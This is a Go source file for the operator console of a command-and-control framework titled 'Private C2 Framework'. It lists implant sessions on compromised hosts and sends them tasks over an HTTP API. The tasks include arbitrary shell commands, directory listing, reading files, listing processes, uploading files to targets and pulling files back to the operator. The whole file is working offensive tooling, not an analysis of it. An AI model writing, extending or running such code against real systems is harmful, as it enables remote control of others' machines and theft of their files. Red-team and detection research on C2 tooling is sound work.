package main

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// ANSI color helpers
const (
	colorReset  = "\033[0m"
	colorRed    = "\033[31m"
	colorGreen  = "\033[32m"
	colorYellow = "\033[33m"
	colorCyan   = "\033[36m"
	colorBold   = "\033[1m"
	colorDim    = "\033[2m"
)

// Session represents a remote implant session.
type Session struct {
	ID         string `json:"id"`
	Hostname   string `json:"hostname"`
	Username   string `json:"username"`
	OS         string `json:"os"`
	Arch       string `json:"arch"`
	RemoteAddr string `json:"remote_addr"`
	LastCheckin string `json:"last_checkin"`
	CreatedAt  string `json:"created_at"`
}

// TaskRequest is the body sent to create a new task.
type TaskRequest struct {
	Type string `json:"type"`
	Args string `json:"args,omitempty"`
	Data string `json:"data,omitempty"`
}

// TaskResponse is the response from creating a task.
type TaskResponse struct {
	TaskID string `json:"task_id"`
}

// TaskResult is the response from polling a task.
type TaskResult struct {
	TaskID  string `json:"task_id"`
	Status  string `json:"status"`
	Success bool   `json:"success"`
	Output  string `json:"output"`
	Error   string `json:"error"`
}

func main() {
	serverAddr := flag.String("server", "http://127.0.0.1:8080", "Server HTTP API address")
	flag.Parse()

	printBanner()

	client := &http.Client{Timeout: 10 * time.Second}
	var activeSession *Session

	scanner := bufio.NewScanner(os.Stdin)
	// Increase scanner buffer for large outputs
	scanner.Buffer(make([]byte, 0, 1024*1024), 1024*1024)

	for {
		printPrompt(activeSession)

		if !scanner.Scan() {
			// EOF (Ctrl+D)
			fmt.Println()
			printInfo("Goodbye.")
			break
		}

		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}

		parts := splitArgs(line)
		cmd := strings.ToLower(parts[0])
		args := parts[1:]

		switch cmd {
		case "exit", "quit":
			printInfo("Goodbye.")
			return

		case "help":
			printHelp()

		case "sessions":
			cmdSessions(client, *serverAddr)

		case "ls":
			// "ls" with no active session lists sessions; with active session sends ls task
			if activeSession == nil {
				if len(args) == 0 {
					cmdSessions(client, *serverAddr)
				} else {
					printError("No active session. Use 'use <id>' first.")
				}
			} else {
				path := "."
				if len(args) > 0 {
					path = strings.Join(args, " ")
				}
				cmdTask(client, *serverAddr, activeSession.ID, "ls", path, "")
			}

		case "use", "interact":
			if len(args) < 1 {
				printError("Usage: use <session-id-prefix>")
				continue
			}
			activeSession = cmdUse(client, *serverAddr, args[0])

		case "info":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			cmdInfo(client, *serverAddr, activeSession.ID)

		case "shell":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			if len(args) < 1 {
				printError("Usage: shell <command>")
				continue
			}
			cmdTask(client, *serverAddr, activeSession.ID, "shell", strings.Join(args, " "), "")

		case "!":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			if len(args) < 1 {
				printError("Usage: ! <command>")
				continue
			}
			cmdTask(client, *serverAddr, activeSession.ID, "shell", strings.Join(args, " "), "")

		case "pwd":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			cmdTask(client, *serverAddr, activeSession.ID, "pwd", "", "")

		case "cd":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			if len(args) < 1 {
				printError("Usage: cd <path>")
				continue
			}
			cmdTask(client, *serverAddr, activeSession.ID, "cd", strings.Join(args, " "), "")

		case "ps":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			cmdTask(client, *serverAddr, activeSession.ID, "ps", "", "")

		case "cat":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			if len(args) < 1 {
				printError("Usage: cat <file>")
				continue
			}
			cmdTask(client, *serverAddr, activeSession.ID, "cat", strings.Join(args, " "), "")

		case "upload":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			if len(args) < 2 {
				printError("Usage: upload <local-path> <remote-path>")
				continue
			}
			cmdUpload(client, *serverAddr, activeSession.ID, args[0], args[1])

		case "download":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			if len(args) < 1 {
				printError("Usage: download <remote-path> [local-path]")
				continue
			}
			localPath := ""
			if len(args) >= 2 {
				localPath = args[1]
			}
			cmdDownload(client, *serverAddr, activeSession.ID, args[0], localPath)

		case "back":
			if activeSession != nil {
				printInfo("Session deselected.")
				activeSession = nil
			} else {
				printWarning("No active session.")
			}

		default:
			// Handle "! cmd" when typed as "!cmd" (no space)
			if strings.HasPrefix(cmd, "!") && len(cmd) > 1 {
				if activeSession == nil {
					printError("No active session. Use 'use <id>' first.")
					continue
				}
				fullCmd := cmd[1:] + " " + strings.Join(args, " ")
				cmdTask(client, *serverAddr, activeSession.ID, "shell", strings.TrimSpace(fullCmd), "")
			} else {
				printError(fmt.Sprintf("Unknown command: %s. Type 'help' for available commands.", cmd))
			}
		}
	}
}

// splitArgs splits a command line into arguments, respecting quoted strings.
func splitArgs(line string) []string {
	var args []string
	var current strings.Builder
	inQuote := false
	quoteChar := byte(0)

	for i := 0; i < len(line); i++ {
		c := line[i]
		if inQuote {
			if c == quoteChar {
				inQuote = false
			} else {
				current.WriteByte(c)
			}
		} else {
			if c == '"' || c == '\'' {
				inQuote = true
				quoteChar = c
			} else if c == ' ' || c == '\t' {
				if current.Len() > 0 {
					args = append(args, current.String())
					current.Reset()
				}
			} else {
				current.WriteByte(c)
			}
		}
	}
	if current.Len() > 0 {
		args = append(args, current.String())
	}
	return args
}

func printBanner() {
	fmt.Printf(`
%s%s  ____       _            _            ____ ____  %s
%s%s |  _ \ _ __(_)_   ____ _| |_ ___     / ___|___ \ %s
%s%s | |_) | '__| \ \ / / _  | __/ _ \   | |     __) |%s
%s%s |  __/| |  | |\ V / (_| | ||  __/   | |___ / __/ %s
%s%s |_|   |_|  |_| \_/ \__,_|\__\___|    \____|_____|%s
`,
		colorBold, colorCyan, colorReset,
		colorBold, colorCyan, colorReset,
		colorBold, colorCyan, colorReset,
		colorBold, colorCyan, colorReset,
		colorBold, colorCyan, colorReset,
	)
	fmt.Printf("  %sPrivate C2 Framework — Operator Console%s\n", colorDim, colorReset)
	fmt.Printf("  %sType 'help' for available commands.%s\n\n", colorDim, colorReset)
}

func printPrompt(session *Session) {
	if session != nil {
		short := session.ID
		if len(short) > 8 {
			short = short[:8]
		}
		fmt.Printf("%s%spc2%s [%s%s%s] > ", colorBold, colorCyan, colorReset, colorYellow, short, colorReset)
	} else {
		fmt.Printf("%s%spc2%s > ", colorBold, colorCyan, colorReset)
	}
}

func printError(msg string) {
	fmt.Printf("%s[!] %s%s\n", colorRed, msg, colorReset)
}

func printSuccess(msg string) {
	fmt.Printf("%s[+] %s%s\n", colorGreen, msg, colorReset)
}

func printInfo(msg string) {
	fmt.Printf("%s[*] %s%s\n", colorCyan, msg, colorReset)
}

func printWarning(msg string) {
	fmt.Printf("%s[!] %s%s\n", colorYellow, msg, colorReset)
}

func printHelp() {
	fmt.Printf("\n%s%sAvailable Commands:%s\n\n", colorBold, colorCyan, colorReset)
	helpEntries := []struct{ cmd, desc string }{
		{"sessions, ls", "List all active sessions"},
		{"use <id>", "Select a session by ID prefix (min 4 chars)"},
		{"interact <id>", "Alias for 'use'"},
		{"info", "Show full details of the active session"},
		{"back", "Deselect the active session"},
		{"", ""},
		{"shell <cmd>", "Execute a shell command on the target"},
		{"! <cmd>", "Shorthand for 'shell <cmd>'"},
		{"ls [path]", "List directory contents (with active session)"},
		{"pwd", "Print working directory on target"},
		{"cd <path>", "Change directory on target"},
		{"ps", "List running processes on target"},
		{"cat <file>", "Read file contents on target"},
		{"upload <local> <remote>", "Upload a local file to the target"},
		{"download <remote> [local]", "Download a file from the target"},
		{"", ""},
		{"help", "Show this help message"},
		{"exit, quit", "Exit the console"},
	}
	for _, e := range helpEntries {
		if e.cmd == "" {
			fmt.Println()
			continue
		}
		fmt.Printf("  %s%-28s%s %s\n", colorGreen, e.cmd, colorReset, e.desc)
	}
	fmt.Println()
}

// relativeTime returns a human-friendly relative time string.
func relativeTime(ts string) string {
	t, err := time.Parse(time.RFC3339, ts)
	if err != nil {
		// Try RFC3339Nano
		t, err = time.Parse(time.RFC3339Nano, ts)
		if err != nil {
			return ts
		}
	}
	d := time.Since(t)
	if d < 0 {
		return "just now"
	}
	switch {
	case d < time.Minute:
		s := int(d.Seconds())
		if s <= 1 {
			return "1s ago"
		}
		return fmt.Sprintf("%ds ago", s)
	case d < time.Hour:
		m := int(d.Minutes())
		if m == 1 {
			return "1m ago"
		}
		return fmt.Sprintf("%dm ago", m)
	case d < 24*time.Hour:
		h := int(d.Hours())
		if h == 1 {
			return "1h ago"
		}
		return fmt.Sprintf("%dh ago", h)
	default:
		days := int(d.Hours() / 24)
		if days == 1 {
			return "1d ago"
		}
		return fmt.Sprintf("%dd ago", days)
	}
}

// apiGet performs a GET request and decodes the JSON response.
func apiGet(client *http.Client, url string, target interface{}) error {
	resp, err := client.Get(url)
	if err != nil {
		return fmt.Errorf("connection error: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("server returned %d: %s", resp.StatusCode, strings.TrimSpace(string(body)))
	}

	return json.NewDecoder(resp.Body).Decode(target)
}

// apiPost performs a POST request with a JSON body and decodes the JSON response.
func apiPost(client *http.Client, url string, body interface{}, target interface{}) error {
	data, err := json.Marshal(body)
	if err != nil {
		return fmt.Errorf("failed to marshal request: %v", err)
	}

	resp, err := client.Post(url, "application/json", bytes.NewReader(data))
	if err != nil {
		return fmt.Errorf("connection error: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusCreated {
		respBody, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("server returned %d: %s", resp.StatusCode, strings.TrimSpace(string(respBody)))
	}

	return json.NewDecoder(resp.Body).Decode(target)
}

// cmdSessions fetches and displays all sessions.
func cmdSessions(client *http.Client, server string) {
	var sessions []Session
	if err := apiGet(client, server+"/api/sessions", &sessions); err != nil {
		printError(fmt.Sprintf("Failed to list sessions: %v", err))
		return
	}

	if len(sessions) == 0 {
		printWarning("No active sessions.")
		return
	}

	// Table header
	fmt.Printf("\n%s%-10s %-14s %-10s %-12s %-22s %-12s%s\n",
		colorCyan,
		"ID", "Hostname", "User", "OS/Arch", "Remote Addr", "Last Seen",
		colorReset,
	)
	fmt.Printf("%s%s%s\n", colorDim, strings.Repeat("-", 82), colorReset)

	for _, s := range sessions {
		shortID := s.ID
		if len(shortID) > 8 {
			shortID = shortID[:8]
		}
		osArch := s.OS + "/" + s.Arch
		fmt.Printf("%-10s %-14s %-10s %-12s %-22s %-12s\n",
			shortID, truncate(s.Hostname, 14), truncate(s.Username, 10),
			truncate(osArch, 12), truncate(s.RemoteAddr, 22),
			relativeTime(s.LastCheckin),
		)
	}
	fmt.Println()
}

// truncate shortens a string to maxLen, appending "..." if needed.
func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	if maxLen <= 3 {
		return s[:maxLen]
	}
	return s[:maxLen-3] + "..."
}

// cmdUse selects a session by ID prefix.
func cmdUse(client *http.Client, server string, prefix string) *Session {
	if len(prefix) < 4 {
		printError("Session ID prefix must be at least 4 characters.")
		return nil
	}

	var sessions []Session
	if err := apiGet(client, server+"/api/sessions", &sessions); err != nil {
		printError(fmt.Sprintf("Failed to list sessions: %v", err))
		return nil
	}

	prefix = strings.ToLower(prefix)
	var matches []Session
	for _, s := range sessions {
		if strings.HasPrefix(strings.ToLower(s.ID), prefix) {
			matches = append(matches, s)
		}
	}

	switch len(matches) {
	case 0:
		printError(fmt.Sprintf("No session matching prefix '%s'.", prefix))
		return nil
	case 1:
		s := &matches[0]
		short := s.ID
		if len(short) > 8 {
			short = short[:8]
		}
		printSuccess(fmt.Sprintf("Active session: %s (%s@%s)", short, s.Username, s.Hostname))
		return s
	default:
		printError(fmt.Sprintf("Ambiguous prefix '%s' matches %d sessions. Be more specific.", prefix, len(matches)))
		for _, s := range matches {
			short := s.ID
			if len(short) > 8 {
				short = short[:8]
			}
			fmt.Printf("  %s %s@%s\n", short, s.Username, s.Hostname)
		}
		return nil
	}
}

// cmdInfo displays detailed information about the active session.
func cmdInfo(client *http.Client, server string, sessionID string) {
	var s Session
	if err := apiGet(client, server+"/api/sessions/"+sessionID, &s); err != nil {
		printError(fmt.Sprintf("Failed to get session info: %v", err))
		return
	}

	fmt.Printf("\n%s%sSession Details%s\n", colorBold, colorCyan, colorReset)
	fmt.Printf("%s%s%s\n", colorDim, strings.Repeat("-", 40), colorReset)
	fmt.Printf("  %sID:%s          %s\n", colorCyan, colorReset, s.ID)
	fmt.Printf("  %sHostname:%s    %s\n", colorCyan, colorReset, s.Hostname)
	fmt.Printf("  %sUsername:%s    %s\n", colorCyan, colorReset, s.Username)
	fmt.Printf("  %sOS:%s          %s\n", colorCyan, colorReset, s.OS)
	fmt.Printf("  %sArch:%s        %s\n", colorCyan, colorReset, s.Arch)
	fmt.Printf("  %sRemote Addr:%s %s\n", colorCyan, colorReset, s.RemoteAddr)
	fmt.Printf("  %sLast Checkin:%s %s (%s)\n", colorCyan, colorReset, s.LastCheckin, relativeTime(s.LastCheckin))
	fmt.Printf("  %sCreated:%s     %s\n", colorCyan, colorReset, s.CreatedAt)
	fmt.Println()
}

// cmdTask submits a task and polls until completion.
func cmdTask(client *http.Client, server string, sessionID string, taskType string, taskArgs string, taskData string) {
	req := TaskRequest{
		Type: taskType,
		Args: taskArgs,
		Data: taskData,
	}

	var resp TaskResponse
	url := fmt.Sprintf("%s/api/sessions/%s/task", server, sessionID)
	if err := apiPost(client, url, req, &resp); err != nil {
		printError(fmt.Sprintf("Failed to submit task: %v", err))
		return
	}

	printInfo(fmt.Sprintf("Task submitted: %s", resp.TaskID))

	// Poll for completion
	taskURL := fmt.Sprintf("%s/api/tasks/%s", server, resp.TaskID)
	timeout := time.After(30 * time.Second)
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-timeout:
			printWarning("Task timed out after 30 seconds. It may still be running on the target.")
			printInfo(fmt.Sprintf("Check later with task ID: %s", resp.TaskID))
			return
		case <-ticker.C:
			var result TaskResult
			if err := apiGet(client, taskURL, &result); err != nil {
				printError(fmt.Sprintf("Failed to poll task: %v", err))
				return
			}

			if result.Status == "completed" {
				if result.Success {
					if result.Output != "" {
						fmt.Print(result.Output)
						// Ensure output ends with newline
						if !strings.HasSuffix(result.Output, "\n") {
							fmt.Println()
						}
					} else {
						printSuccess("Task completed (no output).")
					}
				} else {
					printError(fmt.Sprintf("Task failed: %s", result.Error))
				}
				return
			}

			if result.Status == "failed" {
				printError(fmt.Sprintf("Task failed: %s", result.Error))
				return
			}
			// status is "pending" — keep polling
		}
	}
}

// cmdUpload reads a local file and uploads it to the target.
func cmdUpload(client *http.Client, server string, sessionID string, localPath string, remotePath string) {
	data, err := os.ReadFile(localPath)
	if err != nil {
		printError(fmt.Sprintf("Failed to read local file: %v", err))
		return
	}

	encoded := base64.StdEncoding.EncodeToString(data)
	printInfo(fmt.Sprintf("Uploading %s (%d bytes) -> %s", localPath, len(data), remotePath))

	cmdTask(client, server, sessionID, "upload", remotePath, encoded)
}

// cmdDownload downloads a file from the target and saves it locally.
func cmdDownload(client *http.Client, server string, sessionID string, remotePath string, localPath string) {
	if localPath == "" {
		localPath = filepath.Base(remotePath)
	}

	req := TaskRequest{
		Type: "download",
		Args: remotePath,
	}

	var resp TaskResponse
	url := fmt.Sprintf("%s/api/sessions/%s/task", server, sessionID)
	if err := apiPost(client, url, req, &resp); err != nil {
		printError(fmt.Sprintf("Failed to submit download task: %v", err))
		return
	}

	printInfo(fmt.Sprintf("Downloading %s -> %s", remotePath, localPath))

	// Poll for completion
	taskURL := fmt.Sprintf("%s/api/tasks/%s", server, resp.TaskID)
	timeout := time.After(30 * time.Second)
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-timeout:
			printWarning("Download timed out after 30 seconds.")
			return
		case <-ticker.C:
			var result TaskResult
			if err := apiGet(client, taskURL, &result); err != nil {
				printError(fmt.Sprintf("Failed to poll task: %v", err))
				return
			}

			if result.Status == "completed" {
				if !result.Success {
					printError(fmt.Sprintf("Download failed: %s", result.Error))
					return
				}

				decoded, err := base64.StdEncoding.DecodeString(result.Output)
				if err != nil {
					printError(fmt.Sprintf("Failed to decode file data: %v", err))
					return
				}

				if err := os.WriteFile(localPath, decoded, 0644); err != nil {
					printError(fmt.Sprintf("Failed to write local file: %v", err))
					return
				}

				printSuccess(fmt.Sprintf("Downloaded %d bytes to %s", len(decoded), localPath))
				return
			}

			if result.Status == "failed" {
				printError(fmt.Sprintf("Download failed: %s", result.Error))
				return
			}
		}
	}
}
